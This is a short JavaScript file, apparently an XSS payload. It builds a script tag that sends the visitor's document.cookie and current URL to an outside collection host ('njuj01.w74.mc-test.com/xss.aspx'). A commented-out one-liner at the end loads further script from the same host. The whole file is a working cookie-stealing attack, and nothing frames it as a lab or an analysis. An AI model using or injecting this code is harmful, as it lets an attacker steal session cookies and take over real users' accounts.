new (function (rurl) {
    var me = this;
    this.rurl = rurl;
    this.callrjs = function (js_url, cb) {
        var _doc = document.getElementsByTagName('head')[0];
        var js = document.createElement('script');
        js.setAttribute('type', 'text/javascript');
        js.setAttribute('src', js_url);
        _doc.appendChild(js);
        if (!/*@cc_on!@*/0) { //if not IE//Firefox2¡¢Firefox3¡¢Safari3.1+Opera9.6        
            js.onload = function () {
                if (cb)cb();
            }
        } else {//IE6¡¢IE7        
            js.onreadystatechange = function () {
                if (js.readyState == 'loaded' || js.readyState == 'complete') {
                    if(cb) cb();
                }
            }
        }
    };
    this.report = function (data) {
        var cookie = document.cookie;
        var url = document.URL;
        me.callrjs(this.rurl+"?cookie="+escape(document.cookie)+"&pathandquery="+document.location+"&_="+Math.random())
    };
})("http://njuj01.w74.mc-test.com/xss.aspx").report();


//d=document;e=d.createElement('script');e.src='njuj01.w74.mc-test.com/app_admin/';d.body.appendChild(e);